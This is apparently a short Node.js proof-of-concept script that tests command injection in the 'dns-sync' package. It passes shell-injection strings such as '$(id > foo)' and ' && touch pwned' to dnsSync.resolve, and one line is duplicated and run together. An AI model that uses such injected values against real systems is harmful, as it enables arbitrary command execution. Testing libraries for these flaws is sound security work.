var dnsSync = require('dns-sync');
// console.log(dnsSync.resolve('$(id > foo)'));
// console.log(dnsSync.resolve(''));
// console.log(dnsSync.resolve('$(id > foo)'));
// console.log(dnsSync.resolve('$(id > ./foo)'));
// console.log(dnsSync.resolve('www.google.com', ' && touch pwned'));     //should return the IP addressconsole.log(dnsSync.resolve('www.google.com', ' && touch pwned'));     //should return the IP address
console.log(dnsSync.resolve('www.google.com', ' && touch pwned'));     //should return the IP address
